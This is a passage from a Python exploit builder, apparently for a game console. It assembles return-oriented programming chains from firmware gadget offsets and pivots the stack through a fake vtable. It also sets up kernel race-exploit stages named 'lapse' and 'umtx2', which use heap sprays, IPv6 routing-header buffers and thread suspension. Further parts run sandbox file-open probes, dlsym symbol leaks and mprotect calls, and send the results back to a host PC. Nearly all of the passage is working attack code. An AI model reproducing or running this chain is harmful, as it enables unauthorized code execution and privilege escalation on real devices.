                "libkernel.sprx",
                "libkernel_web.sprx",
                "libc.sprx",
            ]
            dlsym_symbols = args.lowrop_dlsym_symbol or ["YQOfxL4QfeU#I#A"]
            dlsym_cases = [(name, symbol) for name in module_names for symbol in dlsym_symbols]
            msg = b"\x00" * (24 * len(dlsym_cases))
            dlsym_symbol_off = args.lowrop_dlsym_symbol_offset
            dlsym_out_off = args.lowrop_dlsym_out_offset
            dlsym_blobs = []
            cursor = dlsym_symbol_off
            for symbol in dlsym_symbols:
                blob = symbol.encode("ascii", errors="replace") + b"\x00"
                dlsym_blobs.append((symbol, cursor, blob))
                cursor = (cursor + len(blob) + 7) & ~7
            module_name_blobs = []
            cursor = (cursor + 0x3F) & ~0x3F
            for name in module_names:
                blob = name.encode("ascii", errors="replace") + b"\x00"
                module_name_blobs.append((name, cursor, blob))
                cursor = (cursor + len(blob) + 7) & ~7
        elif lowrop_module_table_leak:
            module_table_entries = max(0, min(args.lowrop_module_table_entries, 32))
            msg_qwords = 4 + module_table_entries * (1 + len(LIBKERNEL_MODULE_TABLE_FIELDS))
            msg = b"\x00" * (8 * msg_qwords)
        elif lowrop_dynlib_list_probe:
            dynlib_list_max = max(1, min(args.lowrop_dynlib_list_max, 128))
            dynlib_header_size = 0x30 if args.lowrop_dynlib_capture_errno else 0x20
            msg = b"\x00" * ((dynlib_header_size + dynlib_list_max * 4 + 7) & ~7)
        elif lowrop_wrapper_call_probe:
            wrapper_min_msg = 0x50 if args.lowrop_wrapper_capture_errno else 0x40
            if args.lowrop_wrapper_use_setcontext:
                wrapper_min_msg = max(wrapper_min_msg, 0x600)
            msg = bytearray(b"\x00" * max(wrapper_min_msg, min(args.lowrop_wrapper_msg_len, 0x4000)))
        elif lowrop_direct_syscall_probe:
            msg = bytearray(b"\x00" * max(0x40, min(args.lowrop_direct_syscall_msg_len, 0x4000)))
        elif lowrop_code_read_probe:
            code_read_len = max(1, min(args.lowrop_code_read_len, 0x1000))
            code_copy_off = 0x80
            code_msg_len = max(code_copy_off + code_read_len, min(args.lowrop_code_read_msg_len, 0x4000))
            if code_msg_len > 0x4000:
                raise RuntimeError("--lowrop-code-read-len is too large for the scratch message")
            msg = bytearray(b"\x00" * code_msg_len)
        elif lowrop_sandbox_probe:
            raw_paths = args.lowrop_sandbox_path or DEFAULT_SANDBOX_PROBE_PATHS
            max_paths = max(1, min(args.lowrop_sandbox_max_paths, 48))
            sandbox_paths = [p for p in raw_paths if p][:max_paths]
            msg_len = SANDBOX_PROBE_HEADER_SIZE + len(sandbox_paths) * SANDBOX_PROBE_RECORD_SIZE
            msg = bytearray(b"\x00" * msg_len)
            msg[0:8] = SANDBOX_PROBE_MAGIC
            struct.pack_into("<QQ", msg, 0x08, len(sandbox_paths), SANDBOX_PROBE_RECORD_SIZE)
            for i, path in enumerate(sandbox_paths):
                path_blob = path.encode("utf-8", errors="replace")[:0x5F] + b"\x00"
                rec = SANDBOX_PROBE_HEADER_SIZE + i * SANDBOX_PROBE_RECORD_SIZE
                struct.pack_into(
                    "<IIQQQ",
                    msg,
                    rec,
                    1,
                    len(path_blob) - 1,
                    args.lowrop_sandbox_open_flags & 0xFFFFFFFFFFFFFFFF,
                    0xFFFFFFFFFFFFFFFF,
                    0xFFFFFFFFFFFFFFFF,
                )
                msg[rec + 0x20:rec + 0x20 + len(path_blob)] = path_blob
        elif lowrop_lapse_preflight:
            msg = bytearray(b"\x00" * 0x1000)
            msg[0x00:0x08] = b"LAPSEPF1"
            struct.pack_into("<HH", msg, 0x210, 2, 0)
            struct.pack_into("<I", msg, 0x300 + 0x08, 1)
        elif lowrop_umtx2_preflight or lowrop_umtx2_wrapper_preflight:
            msg = bytearray(b"\x00" * 0x1000)
            msg[0x00:0x08] = b"UMTX2PF!"
            struct.pack_into("<QQ", msg, 0x200, 0x3258544D55535452, 0x0000000000000001)
        elif lowrop_umtx2_race_one:
            inline_spray_count = max(0, min(args.lowrop_umtx2_inline_spray_count, 16))
            worker_spray = args.lowrop_umtx2_worker_spray
            msg_len = (
                0x3A00 if worker_spray and inline_spray_count <= 4
                else 0x3600 if inline_spray_count <= 4
                else 0x3800 if inline_spray_count <= 8
                else 0x5000
            )
            available_msg_len = args.lowrop_copy_len - args.lowrop_msg_offset
            if available_msg_len < msg_len:
                raise RuntimeError(
                    f"umtx2 race msg len 0x{msg_len:X} exceeds copy window 0x{available_msg_len:X}"
                )
            msg = bytearray(b"\x00" * msg_len)
            msg[0x00:0x08] = b"UMTX2R1!"
            struct.pack_into("<QQ", msg, 0x200, 0x3152584D55535452, 0x0000000000000001)
            struct.pack_into("<QQ", msg, 0x210, 0x3252584D55535452, 0x0000000000000001)
            struct.pack_into("<Q", msg, 0x1B0, inline_spray_count)
            for i in range(inline_spray_count):
                struct.pack_into("<Q", msg, 0x1C0 + i * 8, 0x100000 + i * 0x4000)
                struct.pack_into("<Q", msg, 0x220 + i * 8, 0xFFFFFFFFFFFFFFFF)
                struct.pack_into("<Q", msg, 0x260 + i * 8, 0xFFFFFFFFFFFFFFFF)
                struct.pack_into("<Q", msg, 0x2A0 + i * 8, 0xFFFFFFFFFFFFFFFF)
            struct.pack_into("<Q", msg, 0xA8, 0xFFFFFFFFFFFFFFFF)
            msg[0x418:0x41B] = b"RUN"
        elif lowrop_umtx2_spray_existing:
            spray_count = max(1, min(args.lowrop_umtx2_spray_count, 16))
            msg = bytearray(b"\x00" * 0x3000)
            msg[0x00:0x08] = b"UMTX2SP!"
            struct.pack_into("<QQ", msg, 0x20, args.lowrop_umtx2_existing_fd & 0xFFFFFFFFFFFFFFFF, spray_count)
            struct.pack_into("<QQ", msg, 0x200, 0x3253584D55535452, 0x0000000000000001)
            for i in range(spray_count):
                struct.pack_into("<Q", msg, 0x400 + i * 8, 0x100000 + i * 0x4000)
        elif lowrop_umtx2_map_existing:
            msg = bytearray(b"\x00" * 0x1000)
            msg[0x00:0x08] = b"UMTX2MP!"
            struct.pack_into(
                "<QQ",
                msg,
                0x20,
                args.lowrop_umtx2_existing_fd & 0xFFFFFFFFFFFFFFFF,
                args.lowrop_umtx2_winner_fd & 0xFFFFFFFFFFFFFFFF,
            )
        elif lowrop_lapse_thread_preflight:
            msg = bytearray(b"\x00" * 0x1800)
            msg[0x00:0x08] = b"LAPSTH1!"
        elif lowrop_lapse_worker_preflight:
            msg = bytearray(b"\x00" * 0x2800)
            msg[0x00:0x08] = b"LAPSWK1!"
            struct.pack_into("<I", msg, 0x220 + 0x08, 1)
            struct.pack_into("<HH", msg, 0x280, 2, 0x100)
            struct.pack_into("<Q", msg, 0x288, 1 << 4)
        elif lowrop_lapse_suspend_preflight:
            msg = bytearray(b"\x00" * 0x2800)
            msg[0x00:0x08] = b"LAPSSU1!"
            struct.pack_into("<I", msg, 0x220 + 0x08, 1)
            struct.pack_into("<HH", msg, 0x280, 2, 0x100)
            struct.pack_into("<Q", msg, 0x288, 1 << 4)
        elif lowrop_lapse_race_one or lowrop_lapse_race_rthdr:
            rthdr_sds_base = 0x1A00 if (lowrop_lapse_uses_ack_pipe or lowrop_lapse_worker_ready_ack) else 0x1900
            rthdr_segment_floor = lowrop_lapse_rthdr_segment_floor + (
                lowrop_lapse_pre_suspend_yields
                + (1 if lowrop_lapse_pre_suspend_sleep_ns else 0)
                + lowrop_lapse_pre_suspend_getpid_loops
                + (1 if lowrop_lapse_worker_after_read_ack else 0)
                + lowrop_lapse_post_poll_yields
                + (1 if lowrop_lapse_conn_drain_len else 0)
            ) * 0x80
            rthdr_extra_segments = (
                lowrop_lapse_post_resume_yields
                + (1 if lowrop_lapse_uses_ack_signal else 0)
                + (1 if lowrop_lapse_post_resume_sleep_ns else 0)
                if lowrop_lapse_race_rthdr
                else 0
            )
            rthdr_layout = lapse_rthdr_layout(
                lowrop_lapse_rthdr_count,
                rthdr_sds_base if lowrop_lapse_race_rthdr else 0x3300,
                rthdr_extra_segments,
                lowrop_lapse_rthdr_set_loops if lowrop_lapse_race_rthdr else 1,
                rthdr_segment_floor if lowrop_lapse_race_rthdr else None,
            )
            msg = bytearray(b"\x00" * (rthdr_layout["msg_len"] if lowrop_lapse_race_rthdr else 0x3300))
            msg[0x00:0x08] = b"LAPSRH2!" if lowrop_lapse_race_rthdr else b"LAPSR11!"
            # sockaddr_in for 127.0.0.1:0. getsockname fills the chosen port.
            msg[0x200] = 16
            msg[0x201] = 2
            struct.pack_into("<I", msg, 0x204, 0x0100007F)
            struct.pack_into("<I", msg, 0x214, 16)
            struct.pack_into("<I", msg, 0x218, 1)
            struct.pack_into("<II", msg, 0x220, 1, 1)
            for i in range(3):
                struct.pack_into("<I", msg, 0x380 + i * 0x28 + 0x20, 0xFFFFFFFF)
            struct.pack_into("<HH", msg, 0x580, 2, 0x100)
            struct.pack_into("<Q", msg, 0x588, 1 << 4)
            if lowrop_lapse_race_rthdr:
                rthdr_buf_off = rthdr_layout["rthdr_buf_off"]
                msg[rthdr_buf_off + 0] = 0
                msg[rthdr_buf_off + 1] = 14
                msg[rthdr_buf_off + 2] = 0
                msg[rthdr_buf_off + 3] = 7
                for i in range(rthdr_buf_off + 8, rthdr_buf_off + 0x78):
                    msg[i] = 0xA5
                if lowrop_lapse_rthdr_per_socket_setbuf:
                    for i in range(lowrop_lapse_rthdr_count):
                        setbuf_off = rthdr_layout["getbuf_off"] + i * 0x80
                        msg[setbuf_off + 0] = 0
                        msg[setbuf_off + 1] = 14
                        msg[setbuf_off + 2] = 0
                        msg[setbuf_off + 3] = 7
                        struct.pack_into("<I", msg, setbuf_off + 4, i + 1)
                        for j in range(setbuf_off + 8, setbuf_off + 0x78):
                            msg[j] = 0xA5
                for i in range(lowrop_lapse_rthdr_count):
                    struct.pack_into("<Q", msg, rthdr_layout["optlen_off"] + i * 8, 0x80)
        elif lowrop_lapse_rthdr_preflight:
            rthdr_layout = lapse_rthdr_layout(
                lowrop_lapse_rthdr_count,
                0x300,
                0,
                lowrop_lapse_rthdr_set_loops,
            )
            msg = bytearray(b"\x00" * max(0x1000, rthdr_layout["msg_len"]))
            msg[0x00:0x08] = b"LAPSRH1!"
            # IPv6 routing header built like Y2JB build_rthdr(buf, 0x80):
            # len = 14, actual size = 0x78, marker at +4.
            rthdr_buf_off = rthdr_layout["rthdr_buf_off"]
            msg[rthdr_buf_off] = 0
            msg[rthdr_buf_off + 1] = 14
            msg[rthdr_buf_off + 2] = 0
            msg[rthdr_buf_off + 3] = 7
            struct.pack_into("<I", msg, rthdr_buf_off + 4, 0x51525354)
            for i in range(rthdr_buf_off + 8, rthdr_buf_off + 0x78):
                msg[i] = 0xA5
            for i in range(lowrop_lapse_rthdr_count):
                struct.pack_into("<Q", msg, rthdr_layout["optlen_off"] + i * 8, 0x80)
        elif lowrop_self_dlsym_probe:
            dlsym_symbols = args.lowrop_dlsym_symbol or ["YQOfxL4QfeU#I#A"]
            dlsym_cases = [(args.lowrop_self_dlsym_flavor, symbol) for symbol in dlsym_symbols]
            msg = b"\x00" * (24 * len(dlsym_cases))
            dlsym_symbol_off = args.lowrop_dlsym_symbol_offset
            dlsym_out_off = args.lowrop_dlsym_out_offset
            dlsym_blobs = []
            cursor = dlsym_symbol_off
            for symbol in dlsym_symbols:
                blob = symbol.encode("ascii", errors="replace") + b"\x00"
                dlsym_blobs.append((symbol, cursor, blob))
                cursor = (cursor + len(blob) + 7) & ~7
        elif lowrop_self_info_leak:
            msg = b"\x00" * 0x18
        elif lowrop_mprotect_probe:
            msg = pack64(0) + pack64(0x4D50524F54444552)  # MPROTDER
            if args.lowrop_mprotect_addr is not None:
                mprotect_target_kind = "explicit"
                mprotect_target_page = args.lowrop_mprotect_addr & ~(PAGE_SIZE - 1)
            elif mprotect_target_kind == "stack":
                mprotect_target_page = stack_addr & ~(PAGE_SIZE - 1)
            else:
                mprotect_target_page = scratch & ~(PAGE_SIZE - 1)
        elif lowrop_indirect_send_probe:
            msg = b"INDIRECT_SEND_OK\n"
        elif lowrop_eboot_getpid_probe:
            msg = b"\x00" * 0x20
        elif lowrop_eboot_gettimeofday_probe:
            msg = b"\x00" * 0x30
        elif lowrop_eboot_mprotect_probe:
            msg = b"\x00" * (0x40 if getattr(args, "lowrop_mprotect_capture_errno", False) else 0x30)
            if args.lowrop_mprotect_addr is not None:
                mprotect_target_kind = "explicit"
                mprotect_target_page = args.lowrop_mprotect_addr & ~(PAGE_SIZE - 1)
            elif mprotect_target_kind == "stack":
                mprotect_target_page = stack_addr & ~(PAGE_SIZE - 1)
            else:
                mprotect_target_page = scratch & ~(PAGE_SIZE - 1)
        elif lowrop_libc_gettimeofday_probe:
            msg = b"\x00" * 0x40
        elif lowrop_libc_getpid_probe:
            msg = b"\x00" * 0x20
        elif getattr(args, "stack_lowrop_got_leak", False):
            leak_offsets = args.lowrop_leak_eboot_offset or [0x126538]
            msg = b"\x00" * (8 * len(leak_offsets))
        else:
            msg = args.lowrop_msg.encode("ascii", errors="replace")
            if not msg.endswith(b"\n"):
                msg += b"\n"

        truncate_tail = max(0, getattr(args, "lowrop_truncate_msg_tail", 0))
        if truncate_tail:
            if truncate_tail >= len(msg):
                raise RuntimeError("--lowrop-truncate-msg-tail removes the whole lowrop message")
            msg = msg[:-truncate_tail]

        chain_reserve = 0x90
        if leak_offsets is not None:
            chain_reserve = 0x90 + 0x20 * len(leak_offsets)
        if lowrop_notify:
            chain_reserve = 0x800
        if lowrop_dlsym_probe:
            chain_reserve = 0x100 + 0x90 * len(dlsym_cases)
        if lowrop_module_dlsym_probe:
            chain_reserve = 0x180 + 0xE0 * len(dlsym_cases)
        if lowrop_module_table_leak:
            module_table_reads = 4 + module_table_entries * (1 + len(LIBKERNEL_MODULE_TABLE_FIELDS))
            chain_reserve = 0x180 + 0x80 * module_table_reads
        if lowrop_dynlib_list_probe:
            chain_reserve = 0x240
        if lowrop_wrapper_call_probe:
            chain_reserve = 0x900 if args.lowrop_wrapper_use_setcontext else 0x240
        if lowrop_direct_syscall_probe:
            chain_reserve = 0x300
        if lowrop_code_read_probe:
            chain_reserve = 0x380
        if lowrop_sandbox_probe:
            chain_reserve = 0x180 + 0x180 * len(sandbox_paths)
        if lowrop_umtx2_preflight:
            chain_reserve = 0x1800
        if lowrop_umtx2_wrapper_preflight:
            chain_reserve = 0x1200
        if lowrop_umtx2_race_one:
            chain_reserve = 0x2600
        if lowrop_umtx2_map_existing:
            chain_reserve = 0x1000
        if lowrop_lapse_preflight:
            chain_reserve = 0x3200
        if lowrop_lapse_thread_preflight:
            chain_reserve = 0x2200
        if lowrop_lapse_worker_preflight or lowrop_lapse_suspend_preflight:
            chain_reserve = 0x2F00
        if lowrop_lapse_race_one:
            chain_reserve = 0x3A00
        if lowrop_lapse_race_rthdr:
            chain_reserve = (
                0x4200
                + lowrop_lapse_rthdr_count * 0x280
                + lowrop_lapse_post_resume_yields * 0x120
                + lowrop_lapse_pre_barrier_yields * 0x120
                + (0x120 if lowrop_lapse_pre_barrier_sleep_ns else 0)
                + lowrop_lapse_pre_barrier_getpid_loops * 0x120
                + lowrop_lapse_pre_barrier_rop_nops * 0x10
                + lowrop_lapse_pre_suspend_rop_nops * 0x10
                + lowrop_lapse_post_poll_rop_nops * 0x10
                + lowrop_lapse_post_poll_yields * 0x120
                + lowrop_lapse_post_resume_rop_nops * 0x10
                + lowrop_lapse_pre_suspend_getpid_loops * 0x120
                + (0x120 if lowrop_lapse_post_resume_sleep_ns else 0)
                + (0x180 if lowrop_lapse_uses_ack_signal else 0)
                + (0x180 if lowrop_lapse_worker_ready_ack else 0)
                + (0x300 if lowrop_lapse_worker_ready_pipe else 0)
                + (0x300 if lowrop_lapse_worker_after_read_ack else 0)
                + (0x200 if lowrop_lapse_pre_reclaim_send else 0)
                + (0x200 if lowrop_lapse_post_reclaim_send else 0)
                + (0x200 if lowrop_lapse_post_main_delete_send else 0)
                + (0x200 if lowrop_lapse_pre_delete_send else 0)
                + (0x500 if lowrop_lapse_debug_sends else 0)
                + (0x200 if lowrop_lapse_after_ack_send else 0)
                + (0x380 if lowrop_lapse_block_workers else 0)
                + (0x240 if lowrop_lapse_main_prio_pin else 0)
                + lowrop_lapse_pre_suspend_yields * 0x120
                + (0x120 if lowrop_lapse_pre_suspend_sleep_ns else 0)
            )
            if external_msg:
                # The original reserve assumed the rthdr state and the ROP
                # chain both lived in the copied low scratch object.  With an
                # external message buffer only the chain is copied, and putb()
                # below still enforces the true final chain length.
                compact_reserve = (
                    0x2600
                    + lowrop_lapse_rthdr_count * 0x180
                    + lowrop_lapse_post_resume_yields * 0xC0
                    + lowrop_lapse_pre_barrier_yields * 0xC0
                    + (0xC0 if lowrop_lapse_pre_barrier_sleep_ns else 0)
                    + lowrop_lapse_pre_barrier_getpid_loops * 0xC0
                    + lowrop_lapse_pre_barrier_rop_nops * 0x10
                    + lowrop_lapse_pre_suspend_rop_nops * 0x10
                    + lowrop_lapse_post_poll_rop_nops * 0x10
                    + lowrop_lapse_post_poll_yields * 0xC0
                    + lowrop_lapse_post_resume_rop_nops * 0x10
                    + lowrop_lapse_pre_suspend_getpid_loops * 0xC0
                    + (0xC0 if lowrop_lapse_post_resume_sleep_ns else 0)
                    + (0x100 if lowrop_lapse_uses_ack_signal else 0)
                    + (0x100 if lowrop_lapse_worker_ready_ack else 0)
                    + (0x200 if lowrop_lapse_worker_ready_pipe else 0)
                    + (0x200 if lowrop_lapse_worker_after_read_ack else 0)
                    + (0x180 if lowrop_lapse_pre_reclaim_send else 0)
                    + (0x180 if lowrop_lapse_post_reclaim_send else 0)
                    + (0x180 if lowrop_lapse_post_main_delete_send else 0)
                    + (0x180 if lowrop_lapse_pre_delete_send else 0)
                    + (0x300 if lowrop_lapse_debug_sends else 0)
                    + (0x180 if lowrop_lapse_after_ack_send else 0)
                    + (0x280 if lowrop_lapse_block_workers else 0)
                    + (0x180 if lowrop_lapse_main_prio_pin else 0)
                    + lowrop_lapse_pre_suspend_yields * 0xC0
                    + (0xC0 if lowrop_lapse_pre_suspend_sleep_ns else 0)
                )
                chain_reserve = min(chain_reserve, compact_reserve)
        if lowrop_lapse_rthdr_preflight:
            chain_reserve = 0x1600
        if lowrop_self_dlsym_probe:
            chain_reserve = 0x180 + 0xD0 * len(dlsym_cases)
        if lowrop_self_info_leak:
            chain_reserve = 0x180
        if lowrop_mprotect_probe:
            chain_reserve = 0x280
        if lowrop_indirect_send_probe:
            chain_reserve = 0x100
        if lowrop_eboot_getpid_probe:
            chain_reserve = 0x180
        if lowrop_eboot_gettimeofday_probe:
            chain_reserve = 0x200
        if lowrop_eboot_mprotect_probe:
            chain_reserve = 0x380
        if lowrop_libc_gettimeofday_probe:
            chain_reserve = 0x280
        if lowrop_libc_getpid_probe:
            chain_reserve = 0x240
        required_base = max(
            pair_off + 0x10,
            args.lowrop_vtable_offset + 0x68,
            args.lowrop_chain_offset + chain_reserve,
        )
        required = required_base if external_msg else max(required_base, args.lowrop_msg_offset + len(msg))
        copy_required = required
        if (
            getattr(args, "lowrop_allow_uncopied_msg_tail", False)
            and lowrop_lapse_race_rthdr
        ):
            copy_required = (
                required_base
                if external_msg
                else max(required_base, args.lowrop_msg_offset + max(0, len(msg) - 0x80))
            )
        if lowrop_notify:
            required = max(
                required,
                path_off + len(path_blob),
                fd_slot_off + 8,
                icon_off + len(icon_blob),
                text_off + len(text_blob),
                const_off + 0x18,
            )
        if lowrop_dlsym_probe:
            required = max(
                required,
                dlsym_out_off + 8 * len(dlsym_cases),
                *(off + len(blob) for _symbol, off, blob in dlsym_blobs),
            )
        if lowrop_module_dlsym_probe:
            required = max(
                required,
                dlsym_out_off + 8 * len(dlsym_cases),
                *(off + len(blob) for _symbol, off, blob in dlsym_blobs),
                *(off + len(blob) for _name, off, blob in module_name_blobs),
            )
        if lowrop_self_dlsym_probe:
            required = max(
                required,
                dlsym_out_off + 8 * len(dlsym_cases),
                *(off + len(blob) for _symbol, off, blob in dlsym_blobs),
            )
        if required > stack_size:
            raise RuntimeError(f"--stack-size too small for lowrop image: need 0x{required:X}")
        if (
            lowrop_notify
            or lowrop_dlsym_probe
            or lowrop_module_dlsym_probe
            or lowrop_module_table_leak
            or lowrop_dynlib_list_probe
            or lowrop_self_dlsym_probe
            or lowrop_self_info_leak
            or lowrop_mprotect_probe
            or lowrop_eboot_getpid_probe
            or lowrop_eboot_gettimeofday_probe
            or lowrop_eboot_mprotect_probe
            or lowrop_libc_gettimeofday_probe
            or lowrop_libc_getpid_probe
            or lowrop_wrapper_call_probe
            or lowrop_direct_syscall_probe
            or lowrop_code_read_probe
            or lowrop_sandbox_probe
            or lowrop_umtx2_preflight
            or lowrop_umtx2_wrapper_preflight
            or lowrop_umtx2_race_one
            or lowrop_umtx2_spray_existing
            or lowrop_lapse_preflight
            or lowrop_lapse_thread_preflight
            or lowrop_lapse_worker_preflight
            or lowrop_lapse_suspend_preflight
            or lowrop_lapse_race_one
            or lowrop_lapse_rthdr_preflight
            or lowrop_lapse_race_rthdr
        ) and copy_len < copy_required:
            copy_len = copy_required
        if copy_len < copy_required or copy_len > stack_size:
            raise RuntimeError(
                f"--lowrop-copy-len must cover 0x{copy_required:X} copied bytes "
                f"(stack image needs 0x{required:X}) and fit in --stack-size"
            )
        if vtable >= (1 << 32) or chain_addr >= (1 << 32):
            raise RuntimeError("lowrop mode needs eboot low enough for xchg esp,eax")
        if args.lowrop_chain_offset & 0xF != 0xD:
            raise RuntimeError("--lowrop-chain-offset low nibble must be 0xD for send() stack alignment")

        stack = bytearray(b"\x00" * stack_size)

        def putq(off, value):
            if off < 0 or off + 8 > stack_size:
                raise RuntimeError(f"lowrop qword outside stack at 0x{off:X}")
            struct.pack_into("<Q", stack, off, value & 0xFFFFFFFFFFFFFFFF)

        def putb(off, value):
            if off < 0 or off + len(value) > stack_size:
                raise RuntimeError(
                    f"lowrop bytes outside stack at 0x{off:X} len=0x{len(value):X} stack=0x{stack_size:X}"
                )
            stack[off:off + len(value)] = value

        # c24f0 calls memcpy(scratch, stack_addr, copy_len).  Keep this pair
        # away from offset 0 because offset 0 becomes the fake vtable object.
        putq(pair_off, stack_addr)
        putq(pair_off + 8, copy_len)
        args.dispatch_arg2 = stack_addr + pair_off
        args.dispatch_arg2_stack = False
        args.dispatch_arg2_stack_offset = None

        # Follow-up target is a virtual call: mov rax,[rdi]; call [rax+0x60].
        # The xchg gadget pivots rsp to low32(vtable), then ret starts here.
        putq(0x00, vtable)
        putq(args.lowrop_vtable_offset + 0x00, args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
        putq(args.lowrop_vtable_offset + 0x08, chain_addr)
        putq(args.lowrop_vtable_offset + 0x60, args.eboot_base + REDIS_EBOOT_XCHG_ESP_EAX_RET)

        chain = bytearray()

        def emitq(value):
            chain.extend(pack64(value))

        def emit_pop_rdx_padded(value):
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDX_RET3)
            emitq(value)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
            chain.extend(b"ROP")
            emitq(0)

        def emit_aligned_call(func_addr):
            if ((chain_addr + len(chain)) & 0xF) == 0:
                emitq(func_addr)
                return
            need = (8 - ((chain_addr + len(chain) + 16) & 0xF)) & 0xF
            ret_off, imm = REDIS_EBOOT_RET_IMM_BY_MOD[need]
            emitq(args.eboot_base + ret_off)
            emitq(func_addr)
            chain.extend(b"\x00" * imm)

        def emit_store_qword(dst_addr, src_const_addr):
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(src_const_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(dst_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        def emit_memcpy(dst_addr, src_addr, size):
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(dst_addr)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
            emitq(src_addr)
            emit_pop_rdx_padded(size)
            emit_aligned_call(args.eboot_base + REDIS_EBOOT_MEMCPY_PLT)

        def emit_store_rax(dst_addr):
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(dst_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        def emit_store_imm64(dst_addr, value):
            emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
            emitq(value & 0xFFFFFFFFFFFFFFFF)
            emit_store_rax(dst_addr)

        def emit_rax_to_rsi():
            # 0x37264 copies rax to rdi but consumes five qwords before ret.
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RDI_RAX_PAD_RET)
            emitq(0)
            emitq(0)
            emitq(0)
            emitq(0)
            emitq(0)
            # 0x4EABF takes the fast path only when selected edx bits are set.
            emit_pop_rdx_padded(1)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RSI_RDI_TEST_EDX_POP_RBP_RET)
            emitq(0)

        if lowrop_notify:
            notify_addr = scratch + notify_off
            path_addr = scratch + path_off
            fd_slot_addr = scratch + fd_slot_off
            icon_addr = scratch + icon_off
            text_addr = scratch + text_off
            const_addr = scratch + const_off
            putq(const_off + 0x00, 0)
            putq(const_off + 0x08, 0xFFFFFFFF)
            putq(const_off + 0x10, 0x0000000100000000)
            putb(path_off, path_blob)
            putb(icon_off, icon_blob)
            putb(text_off, text_blob)

            # Build the notification structure in scratch without increasing
            # the sprayed stack object size.  Only the fields the kernel side
            # consumes are written; this mirrors the JS malloc-based payload.
            emit_store_qword(notify_addr + 0x00, const_addr + 0x00)
            emit_store_qword(notify_addr + 0x10, const_addr + 0x08)
            emit_store_qword(notify_addr + 0x28, const_addr + 0x10)
            emit_memcpy(notify_addr + 0x2D, text_addr, len(text_blob))
            emit_memcpy(notify_addr + 0x42D, icon_addr, len(icon_blob))

            # fd = open("/dev/notification0", O_WRONLY, 0)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(path_addr)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
            emitq(1)
            emit_pop_rdx_padded(0)
            emit_aligned_call(args.eboot_base + REDIS_EBOOT_OPEN_PLT)

            # Save fd from rax.  Reloading it avoids losing the fd after write().
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(fd_slot_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            # write(fd, notify, 0xc30)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(fd_slot_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_XCHG_EDI_EAX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
            emitq(notify_addr)
            emit_pop_rdx_padded(notify_size)
            emit_aligned_call(args.eboot_base + REDIS_EBOOT_WRITE_PLT)

            # close(fd)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(fd_slot_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_XCHG_EDI_EAX_RET)
            emit_aligned_call(args.eboot_base + REDIS_EBOOT_CLOSE_PLT)

        elif lowrop_sandbox_probe:
            for i, _path in enumerate(sandbox_paths):
                rec = SANDBOX_PROBE_HEADER_SIZE + i * SANDBOX_PROBE_RECORD_SIZE
                rec_addr = msg_addr + rec
                path_addr = rec_addr + 0x20
                fd_slot_addr = rec_addr + 0x10
                close_slot_addr = rec_addr + 0x18

                # fd = open(path, flags, 0).  The first probe profile uses
                # read-only flags; the path and result live in the message
                # buffer that is sent back to the PC.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(path_addr)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(args.lowrop_sandbox_open_flags & 0xFFFFFFFFFFFFFFFF)
                emit_pop_rdx_padded(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_OPEN_PLT)
                emit_store_rax(fd_slot_addr)

                # close(fd) unconditionally.  close(-1) is harmless and keeps
                # the chain branch-free.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(fd_slot_addr)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_XCHG_EDI_EAX_RET)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_CLOSE_PLT)
                emit_store_rax(close_slot_addr)

        elif lowrop_dlsym_probe:
            sym_addrs = {}
            for symbol, off, blob in dlsym_blobs:
                putb(off, blob)
                sym_addrs[symbol] = scratch + off
            out_base = scratch + dlsym_out_off

            for i, (handle, symbol) in enumerate(dlsym_cases):
                out_slot = out_base + i * 8
                result_slot = msg_addr + i * 16

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(handle & 0xFFFFFFFFFFFFFFFF)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(sym_addrs[symbol])
                emit_pop_rdx_padded(out_slot)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_DLSYM_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(result_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(out_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(result_slot + 8)
